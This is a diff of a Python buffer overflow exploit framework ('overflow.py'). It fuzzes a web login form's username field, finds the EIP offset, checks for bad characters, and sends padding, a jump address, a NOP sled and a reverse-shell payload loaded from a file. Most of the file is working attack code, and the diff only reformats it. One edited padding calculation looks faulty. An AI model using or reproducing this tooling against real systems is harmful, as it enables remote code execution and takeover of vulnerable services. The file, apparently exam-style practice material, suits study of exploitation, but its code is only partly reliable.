@@ -13,7 +13,6 @@ Name: overflow.py
 ╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝
 """
 
-
 try:
 	import subprocess as sp
 	import socket
@@ -26,7 +25,6 @@ try:
 except ImportError as err:
 	print(f"Import Error: {err}")
 
-
 # -------------------( Ansicolors )-------------------
 rst = "\033[0m"
 bld = "\033[01m"
@@ -36,7 +34,6 @@ yw = "\033[93m"
 be = "\033[94m"
 pe = "\033[95"
 
-
 # -------------------( Custom Exceptions )-------------------
 class InvalidTargetIPError(TypeError):
 	"""Will be raised if the type of the target IP
@@ -45,14 +42,12 @@ class InvalidTargetIPError(TypeError):
 	def __init__(self, error_msg):
 		super().__init__(error_msg)
 
-
 class InvalidTargetPortError(TypeError):
 	"""Will be raised if the type of the target IP
 	is not of type "int"
 	"""
 	def __init__(self, error_msg):
 		super().__init__(error_msg)
-
 
 class InvalidMemoryAddressError(ValueError):
 	"""Will be raised if value passed into the `jump_eip`
@@ -62,18 +57,15 @@ class InvalidMemoryAddressError(ValueError):
 	def __init__(self, error_msg):
 		super().__init__(error_msg)
 
-
 class NoOffsetError(AttributeError):
 	"""Will be raised if offset property has not been set"""
 	def __init__(self, error_msg):
 		super().__init__(error_msg)
 
-
 class NoEipMemoryAddressError(AttributeError):
 	"""Will be raised if `jump_eip` attribute has not been set"""
 	def __init__(sefl, error_msg):
 		super().__init__(error_msg)
-
 
 # -------------------( Class Overflow Definition )-------------------
 class Overflow:
@@ -101,7 +93,6 @@ class Overflow:
 "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
 "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-
 
 	def __init__(
 		self, targ_ip, targ_port, bad_chars=[],
@@ -151,7 +142,6 @@ class Overflow:
 		self._fuzz_interval_seconds = fuzz_interval_seconds
 		self._fuzz_increment = fuzz_increment
 
-
 	def __repr__(self):
 		return (f"Ezfuzz(\n\ttarg_ip = '{self.targ_ip}',\n\ttarg_port = {self.targ_port},"
 				f"\n\tbad_characters = {self.bad_chars},"
@@ -164,12 +154,10 @@ class Overflow:
 	def __str__(self):
 		return f"Ezfuzz(target_ip_address='{self.targ_ip}', target_port={self.targ_port})\n"
 
-
 	@property
 	def targ_ip(self) -> str:
 		"""Returns the current target's IP address"""
 		return self._targ_ip
-
 
 	@targ_ip.setter
 	def targ_ip(self, new_ip):
@@ -191,12 +179,10 @@ class Overflow:
 		else:
 			self._targ_ip = new_ip
 
-
 	@property
 	def targ_port(self) -> int:
 		"""Returns the target application port number"""
 		return self._targ_port
-
 
 	@targ_port.setter
 	def targ_port(self, new_port):
@@ -224,7 +210,6 @@ class Overflow:
 			return None
 		return self._bad_chars
 	
-	
 	def add_bad_char(self, *args):
 		"""Adds bad characters to the instance `bad_chars` list
 
@@ -232,17 +217,14 @@ class Overflow:
 		"""
 		[self._bad_chars.append(arg) for arg in args]
 
-
 	def del_bad_char(self, *args):
 		"""Deletes bad characters from the instance `bad_chars` list"""
 		[self._bad_chars.remove(arg) for arg in args]
-
 
 	@property
 	def max_fuzz_bytes(self) -> int:
 		"""Returns the current value of the `_max_fuzz_bytes` variable"""
 		return self._max_fuzz_bytes
-
 
 	@max_fuzz_bytes.setter
 	def max_fuzz_bytes(self, max_bytes):
@@ -262,13 +244,11 @@ class Overflow:
 		else:
 			self._max_fuzz_bytes = max_bytes
 
-
 	@property
 	def num_bytes_crash(self) -> int:
 		"""Returns the number of bytes it took to crash the application"""
 		return self._num_bytes_crash
 	
-
 	@num_bytes_crash.setter
 	def num_bytes_crash(self, new_bytes_value):
 		"""Sets the number of bytes needed to crash the application. 
@@ -290,12 +270,10 @@ class Overflow:
 		else:
 			self._num_bytes_crash = new_bytes_value
 		
-
 	@property
 	def offset(self) -> int:
 		"""Returns the instance offset value"""
 		return self._offset
-
 
 	@offset.setter
 	def offset(self, offset_value):
@@ -315,13 +293,11 @@ class Overflow:
 		else:
 			self._offset = offset_value
 
-
 	@property
 	def jump_eip(self):
 		"""Returns the memory address variable,`jump_eip`, 
 		containing the jump eip instruction"""
 		return self._jump_eip
-
 
 	@jump_eip.setter
 	def jump_eip(self, jump_mem_location):
@@ -345,13 +321,11 @@ class Overflow:
 		else:
 			self._jump_eip = jump_mem_location
 
-
 	@property
 	def fuzz_interval_seconds(self):
 		"""Returns `_fuzz_interval_seconds` which stores the number of seconds
 		to wait in between each step of the fuzzing process"""
 		return self._fuzz_interval_seconds
-
 
 	@fuzz_interval_seconds.setter
 	def fuzz_interval_seconds(self, sec):
@@ -370,12 +344,10 @@ class Overflow:
 		else:
 			self._fuzz_interval_seconds = sec
 
-
 	@property
 	def fuzz_increment(self):
 		"""Returns the current value set to increment to the fuzzing payloads (default=100)"""
 		return self._fuzz_increment
-
 
 	@fuzz_increment.setter
 	def fuzz_increment(self, new_increment):
@@ -395,7 +367,6 @@ class Overflow:
 		else:
 			self._fuzz_increment = new_increment
 
-
 	def _HTTP_header(self):
 		"""
 		"""
@@ -408,7 +379,6 @@ class Overflow:
 		buff += "Connection: close\r\n"
 		buff += "Content-Type: application/x-www-form-urlencoded\r\n"
 		return buff
-
 
 	def fuzz(self, chars=None, reverse_payload=None):
 		"""Sends an incrementing number of bytes to an application
@@ -433,7 +403,11 @@ class Overflow:
 			print(pe+bld+"[+]"+rst+" -----( Intiating fuzzing procedure )-----")
 			print(yw+bld+"[!]"+rst+" -----( Press Ctrl+C when the application crashes! )-----")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
-				content = "username=" + "A"*self.num_bytes_crash + "&password=A"
+				content = (
+					"username=" 
+					+ "A"*self.num_bytes_crash 
+					+ "&password=A"
+				)
 				buff = self._HTTP_header()
 				buff += f"Content-Length: {str(len(content))}\r\n"
 				buff += "\r\n"
@@ -456,7 +430,9 @@ class Overflow:
 				if not self.offset:
 					raise NoOffsetError("An offset value must be set before sending the bad characters payload")
 				else:
-					content = ("username=" + "A"*self.offset 
+					content = (
+						"username=" 
+						+ "A"*self.offset 
 						+ "B"*4
 						+ "C"*4
 						+ chars
@@ -481,8 +457,11 @@ class Overflow:
 			finally:
 				soc.close()
 		else:
-			content  = ("username=" + "A"*self.offset 
-				+ self.jump_eip + Overflow.nop_sled 
+			content  = (
+				"username=" 
+				+ "A"*self.offset 
+				+ self.jump_eip 
+				+ self.nop_sled 
 				+ reverse_payload 
 				+ "&password=A"
 			)
@@ -501,7 +480,6 @@ class Overflow:
 				exit(1)
 			finally:
 				soc.close()
-
 
 	def send_pattern(self):
 		"""This function will send a payload containing a known pattern of 
@@ -528,7 +506,6 @@ class Overflow:
 			print(r+bld+"[-]"+bld+f" SocketError: {err}")
 			exit(1)
 		
-
 	def get_offset(self, eip_value) -> int:
 		"""Returns the offset based on the `eip_value` argument
 
@@ -539,13 +516,12 @@ class Overflow:
 		self.offset = pattern_offset(eip_value, pattern)
 		return self.offset
 
-
 	def test(self, to_test):
 		"""Will send a specially crafted payload to test if the current offset
 		value is the correct offset.
 		
 		Args:
-			to_test (str): The value to test ("offset" or "eip_address")
+			to_test (str): The value to test ("offset" or "eip")
 
 		Raises:
 			NoOffsetError: if the `get_offset` function has not been invoked
@@ -555,25 +531,28 @@ class Overflow:
 			if to_test == "offset":
 				if not self.offset:
 					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
-				payload = ("A"*self.offset 
-					+ "B"*4 + "C"*(self.num_bytes_crash-self.offset-4)
+				payload = (
+					"A"*self.offset 
+					+ "B"*4 
+					+ "C"*(self.num_bytes_crash-self.offset-4)
 				)
-			if to_test == "eip_address":
+			if to_test == "eip":
 				if not self.offset:
 					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
 				if not self.jump_eip:
 					raise NoEipMemoryAddressError("Please set the `jump_eip` value in order to test jump esp memory address") from None
-				payload = ("A"*self.offset 
-					+ f"{self.jump}"
+				payload = (
+					"A"*self.offset 
+					+ self.jump_eip # Works with the following bytes \x9d\x9e\x9f\xa0 but not \x83\x0c\x09\x10??
 					+ "C"*4
-					+ "D"*(self.num_bytes_crash-self.offset-len(self.nop_sled)-4)
+					+ "D"*(1500-self.offset-self.num_bytes_crash-self.offset-4)
 				)
 			content = "username=" + payload + "&password=A"
 			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
 			buff += content
-			bytes_payload = buff.encode()
+			bytes_payload = bytes(buff, "utf-8")
 		except NoOffsetError as err:
 			print(rd+bld+"[-]"+rst+f" NoOffsetError: {err}")
 			exit(1)
@@ -581,7 +560,7 @@ class Overflow:
 			print(rd+bld+"[-]"+rst+f" NoEipMemoryAddressError: {err}")
 			exit(1)
 		except UnboundLocalError:
-			print(rd+bld+"[-]"+rst+f" InvalidArgument: '{to_test}' ->  Argument to function `test` must be `offset` or `eip_address`")
+			print(rd+bld+"[-]"+rst+f" InvalidArgument: '{to_test}' ->  Argument to function `test` must be `offset` or `eip`")
 			exit(1)
 		else:
 			soc = self._create_socket()
@@ -592,7 +571,6 @@ class Overflow:
 				print(r+bld+"[-]"+bld+f" SocketError: {err}")
 				exit(1)
 
-
 	def send_bad_chars(self):
 		"""Sends the characters string so user can find bad characters"""
 		copy_chars = self.chars
@@ -602,8 +580,6 @@ class Overflow:
 			self.fuzz(chars=copy_chars)
 			return
 		self.fuzz(self.chars)
-
-
 
 	def get_payload(self, payload_file):
 		"""Will retrieve the payload from a generated payload file
@@ -616,7 +592,6 @@ class Overflow:
 		with open(payload_file, "rb") as payload_file:
 			payload = payload_file.read()
 			self.fuzz(reverse_payload=payload)
-
 
 	def _create_socket(self):
 		"""Creates socket for sending payloads"""
